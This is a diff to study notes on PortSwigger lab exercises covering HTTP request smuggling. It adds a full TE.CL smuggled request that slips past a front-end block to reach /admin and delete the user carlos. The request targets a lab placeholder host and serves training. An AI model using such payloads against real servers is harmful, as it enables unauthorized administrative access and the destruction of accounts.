@@ -4480,6 +4480,19 @@ Response: Communication timed out. (chunked size is 5)
   - Info: This lab involves a front-end and back-end server, and the **back-end server doesn't support chunked encoding**. There's an admin panel at /admin, but the front-end server blocks access to it. To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
   - https://www.youtube.com/watch?v=XvqAbDo5DI0
     ```
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-length: 4
+    Transfer-Encoding: chunked
+
+    87
+   GET /admin/delete?username=carlos HTTP/1.1
+   Host: localhost
+   Content-Type: application/x-www-form-urlencoded
+   Content-Length: 15
+
+   x=1
+   0
     ```
 - [8] Exploiting HTTP request smuggling to **reveal front-end request rewriting**
   - Info: This lab involves a front-end and back-end server, and the **front-end server doesn't support chunked encoding**. There's an admin panel at /admin, but it's only accessible to people with the IP address **127.0.0.1**. The front-end server adds an HTTP header to incoming requests containing their IP address. It's **similar to the X-Forwarded-For header** but has a different name. To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.
